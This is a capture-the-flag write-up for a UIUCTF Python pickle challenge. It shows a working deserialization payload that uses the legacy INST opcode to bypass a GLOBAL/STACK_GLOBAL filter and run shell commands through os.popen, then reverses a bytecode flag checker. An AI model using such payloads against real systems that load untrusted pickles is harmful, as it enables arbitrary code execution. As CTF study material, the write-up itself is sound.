The main challenge file is quite short, as follows:

```python
import pickle
import base64
import sys
import pickletools

def check_flag(flag_guess: str):
  """REDACTED FOR PRIVACY"""

cucumber = base64.b64decode(input("Give me your best pickle (base64 encoded) to taste! "))

for opcode, _, _ in pickletools.genops(cucumber):
  if opcode.code == "c" or opcode.code == "\x93":
    print("Eww! I can't eat dill pickles.")
    sys.exit(0)

pickle.loads(cucumber)
```

It is clear that the challenge is about exploiting pickle deserialization. Pickles are python objects serialized into a series of bytecode instructions, and by executing the same bytecode the same python object can be reconstructed elsewhere.  Since we're control the pickle that's loaded, we can pretty much execute arbitrary python code, and a quick google search will reveal many possible payloads. Here is an example:

```python:t.py
import pickle, os, base64

class P(object):
    def __reduce__(self):
        return (os.system, ("ls -l",))

p = pickle.dumps(P())
print(base64.b64encode(p))
```

We can disassemble the bytecode using the picketools module:

```python:t.py
import pickletools

...

print(pickletools.dis(p))
```

The result is as follows:

```plaintext
    0: \x80 PROTO      4
    2: \x95 FRAME      32
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'ls -l'
   37: \x94 MEMOIZE    (as 3)
   38: \x85 TUPLE1
   39: \x94 MEMOIZE    (as 4)
   40: R    REDUCE
   41: \x94 MEMOIZE    (as 5)
   42: .    STOP
highest protocol among opcodes = 4
```

However, in the context of the challenge we’re not allowed to use the `c` and `\x93` operations. Looking up the full list of opcodes [on github](https://github.com/python/cpython/blob/main/Lib/pickle.py#L105), we see that these correspond to the `GLOBAL` and `STACK_GLOBAL` operations. These operations are what allow us access to the execution context and to import modules, so without them we cannot access any builtin functions or classes.

I checked through the list of opcodes to see if any could be useful, and also read through the [pickletools source code](https://github.com/python/cpython/blob/main/Lib/pickletools.py#L1153) where each opcode was well documented. I also looked through the `genops` function, hoping to find some inconsistencies in the way opcodes were generated compared to how they were evaluated, but there was nothing. I also explored the possibility that there might be inconsistencies across different pickle protocol versions, but it seems to be handled perfectly with backwards compatibility.

Eventually, while looking through how each opcode was implemented I saw the `load_inst` function:

```python:pickle.py
...

    def load_inst(self):
        module = self.readline()[:-1].decode("ascii")
        name = self.readline()[:-1].decode("ascii")
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())

...
```

It caught my eye because it called the `find_class` method used to import stuff from a module, and it's also used by `GLOBAL` and `STACK_GLOBAL`. Referring back to its documentation in pickletools basically describes `INST` as an older opcode which is now replaced by the `GLOBAL` and `OBJ` opcodes.

```plaintext:
INST is followed by two newline-terminated strings, giving a
module and class name ... self.find_class(module, name) is used
to get a class object.

In addition, all the objects on the stack following the topmost
markobject are gathered into a tuple and popped (along with the
topmost markobject), just as for the TUPLE opcode.
```

So we can use inst to load whatever function we need and gain arbitrary code execution from there!

Now to craft the payload. My first thought was to call something like `__import__("os").popen("<command>").read()`. First, we call inst with `os` as module name, `popen` as the 'class name', and `<command>` as the argument. Second, we have to load the `getattr` function to access the `read` method. Finally, we add an empty tuple on the stack (since there are no arguments) and invoke the read method using the `REDUCE` opcode.

```python:s.py
from pickle import *
import base64

p = PROTO + b'\x04'
p += MARK
p += MARK
p += MARK
p += STRING + b'"cat chal.py"\n'
p += INST + b'os\npopen\n'
p += STRING + b'"read"\n'
p += INST + b'builtins\ngetattr\n'
p += MARK
p += TUPLE
p += REDUCE
p += INST + b'builtins\nprint\n'
p += STOP

print(base64.b64encode(p))
```

Initially, I submitted the payload with `ls` as the command, however, seeing no `flag.txt` file I output the `chal.py` contents instead, and it is as follows:

```python:chal.py
import pickle
import base64
import sys
import pickletools

def check_flag(flag_guess: str):
  """REDACTED FOR PRIVACY"""

  # What?! How did you find this? Well you won't be able to figure it out from here...
  return pickle.loads(b'\x80\x04\x96+\x00\x00\x00\x00\x00\x00\x00lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8\x94\x8c' + len(flag_guess).to_bytes(1, 'little') + flag_guess.encode() + b'\x94\x8c\x08builtins\x8c\x03all\x93\x94\x94\x8c\x08builtins\x8c\x04list\x93\x94\x94\x8c\x08builtins\x8c\x03map\x93\x94\x94\x8c\x05types\x8c\x08CodeType\x93\x94(K\x01K\x00K\x00K\x01K\x05KCC<|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00(NK\x00K\x01K\x02KaK\xcbt\x8c\x03len\x8c\x01b\x8c\x03ord\x87\x8c\x01x\x85\x8c\x08<pickle>\x8c\x08<pickle>K\x07C\x00tR\x940\x8c\x05types\x8c\x0cFunctionType\x93\x94(h\t}(\x8c\x03len\x8c\x08builtins\x8c\x03len\x93\x94\x94\x8c\x01bh\x01\x8c\x03ord\x8c\x08builtins\x8c\x03ord\x93\x94\x94uN)tR\x8c\x08builtins\x8c\tenumerate\x93\x94\x94h\x00\x85R\x86R\x85R\x85R.')

cucumber = base64.b64decode(input("Give me your best pickle (base64 encoded) to taste! "))

for opcode, _, _ in pickletools.genops(cucumber):
  if opcode.code == "c" or opcode.code == "\x93":
    print("Eww! I can't eat dill pickles.")
    sys.exit(0)

pickle.loads(cucumber)
```

So it seems that there is a second part to this challenge - reversing some pickle bytecode. I disassembled it with pickletools.dis and this was the result:

```plaintext
    0: \x80 PROTO      4
    2: \x96 BYTEARRAY8 bytearray(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8')
   54: \x94 MEMOIZE    (as 0)
   55: \x8c SHORT_BINUNICODE 'uiuctf{guess}'
   70: \x94 MEMOIZE    (as 1)
   71: \x8c SHORT_BINUNICODE 'builtins'
   81: \x8c SHORT_BINUNICODE 'all'
   86: \x93 STACK_GLOBAL
   87: \x94 MEMOIZE    (as 2)
   88: \x94 MEMOIZE    (as 3)
   89: \x8c SHORT_BINUNICODE 'builtins'
   99: \x8c SHORT_BINUNICODE 'list'
  105: \x93 STACK_GLOBAL
  106: \x94 MEMOIZE    (as 4)
  107: \x94 MEMOIZE    (as 5)
  108: \x8c SHORT_BINUNICODE 'builtins'
  118: \x8c SHORT_BINUNICODE 'map'
  123: \x93 STACK_GLOBAL
  124: \x94 MEMOIZE    (as 6)
  125: \x94 MEMOIZE    (as 7)
  126: \x8c SHORT_BINUNICODE 'types'
  133: \x8c SHORT_BINUNICODE 'CodeType'
  143: \x93 STACK_GLOBAL
  144: \x94 MEMOIZE    (as 8)
  145: (    MARK
  146: K        BININT1    1
  148: K        BININT1    0
  150: K        BININT1    0
  152: K        BININT1    1
  154: K        BININT1    5
  156: K        BININT1    67
  158: C        SHORT_BINBYTES b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00'
  220: (        MARK
  221: N            NONE
  222: K            BININT1    0
  224: K            BININT1    1
  226: K            BININT1    2
  228: K            BININT1    97
  230: K            BININT1    203
  232: t            TUPLE      (MARK at 220)
  233: \x8c     SHORT_BINUNICODE 'len'
  238: \x8c     SHORT_BINUNICODE 'b'
  241: \x8c     SHORT_BINUNICODE 'ord'
  246: \x87     TUPLE3
  247: \x8c     SHORT_BINUNICODE 'x'
  250: \x85     TUPLE1
  251: \x8c     SHORT_BINUNICODE '<pickle>'
  261: \x8c     SHORT_BINUNICODE '<pickle>'
  271: K        BININT1    7
  273: C        SHORT_BINBYTES b''
  275: t        TUPLE      (MARK at 145)
  276: R    REDUCE
  277: \x94 MEMOIZE    (as 9)
  278: 0    POP
  279: \x8c SHORT_BINUNICODE 'types'
  286: \x8c SHORT_BINUNICODE 'FunctionType'
  300: \x93 STACK_GLOBAL
  301: \x94 MEMOIZE    (as 10)
  302: (    MARK
  303: h        BINGET     9
  305: }        EMPTY_DICT
  306: (        MARK
  307: \x8c         SHORT_BINUNICODE 'len'
  312: \x8c         SHORT_BINUNICODE 'builtins'
  322: \x8c         SHORT_BINUNICODE 'len'
  327: \x93         STACK_GLOBAL
  328: \x94         MEMOIZE    (as 11)
  329: \x94         MEMOIZE    (as 12)
  330: \x8c         SHORT_BINUNICODE 'b'
  333: h            BINGET     1
  335: \x8c         SHORT_BINUNICODE 'ord'
  340: \x8c         SHORT_BINUNICODE 'builtins'
  350: \x8c         SHORT_BINUNICODE 'ord'
  355: \x93         STACK_GLOBAL
  356: \x94         MEMOIZE    (as 13)
  357: \x94         MEMOIZE    (as 14)
  358: u            SETITEMS   (MARK at 306)
  359: N        NONE
  360: )        EMPTY_TUPLE
  361: t        TUPLE      (MARK at 302)
  362: R    REDUCE
  363: \x8c SHORT_BINUNICODE 'builtins'
  373: \x8c SHORT_BINUNICODE 'enumerate'
  384: \x93 STACK_GLOBAL
  385: \x94 MEMOIZE    (as 15)
  386: \x94 MEMOIZE    (as 16)
  387: h    BINGET     0
  389: \x85 TUPLE1
  390: R    REDUCE
  391: \x86 TUPLE2
  392: R    REDUCE
  393: \x85 TUPLE1
  394: R    REDUCE
  395: \x85 TUPLE1
  396: R    REDUCE
  397: .    STOP
```

It seems to be a flag checker, where the check function represented in python bytecode. I reversed the types.CodeType function call:

```python
types.CodeType(
  argcount=1,
  posonlyargcount=0,
  kwonlyargcount=0,
  nlocals=1,
  stacksize=5,
  flags=67,
  code=b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00',
  consts=(None, 0, 1, 2, 97, 203),
  names=('len', 'b', 'ord'),
  varnames=('x',),
  filename='<pickle>',
  name='<pickle>',
  firstlineno=7,
  lnotab=b'',
)
```

Now I reversed the python bytecode using the `dis` module:

```plaintext
          0 LOAD_FAST                0 (0)
          2 LOAD_CONST               1 (1)
          4 BINARY_SUBSCR
          6 LOAD_GLOBAL              0 (0)
          8 LOAD_GLOBAL              1 (1)
         10 CALL_FUNCTION            1
         12 COMPARE_OP               0 (<)
         14 JUMP_IF_FALSE_OR_POP    58 (to 116)
         16 LOAD_FAST                0 (0)
         18 LOAD_CONST               2 (2)
         20 BINARY_SUBSCR
         22 LOAD_GLOBAL              2 (2)
         24 LOAD_GLOBAL              1 (1)
         26 LOAD_FAST                0 (0)
         28 LOAD_CONST               1 (1)
         30 BINARY_SUBSCR
         32 BINARY_SUBSCR
         34 CALL_FUNCTION            1
         36 LOAD_CONST               3 (3)
         38 LOAD_FAST                0 (0)
         40 LOAD_CONST               1 (1)
         42 BINARY_SUBSCR
         44 LOAD_CONST               4 (4)
         46 BINARY_ADD
         48 BINARY_MULTIPLY
         50 BINARY_ADD
         52 LOAD_CONST               5 (5)
         54 BINARY_MODULO
         56 COMPARE_OP               2 (==)
         58 RETURN_VALUE
```

So decompiling by hand, this function roughly corresponds to the following:

```python
def f(x):
  if x[0] < len(b):
      return x[1] == (ord(b[x[0]]) + 2 * (x[0] + 97)) % 203
```

I then decompiled the rest of the pickle bytecode by hand and this was the result:

```python
for i, c in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):
    if i < len(b):
        assert c == (ord(b[i]) + 2 * (i + 97)) % 203
```

So it's quite a straightforward flag checker, I quickly threw together the following script to solve for the flag:

```python:s2.py
flag = ''

for i, c in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):
    j = 1
    possible = ''
    decoded_c = c + j*203 - 2*(i+97)
    while decoded_c < 128:
        possible += chr(decoded_c) + ' '
        decoded_c = c + j*203 - 2*(i+97)
        j += 1
    flag += possible[0]
    print(possible)

print(flag)
```

This gave the flag:

`uiuctf{N3Ver_Und3r_3stiMate_P1ckles!e2ba24}`

Overall, the main difficulty in the challenge for me was finding the `INST` opcode as the second reversing part was relatively straightforward. I learned quite a bit about pickle bytecode through this, including how frames work and the differences between protocol versions.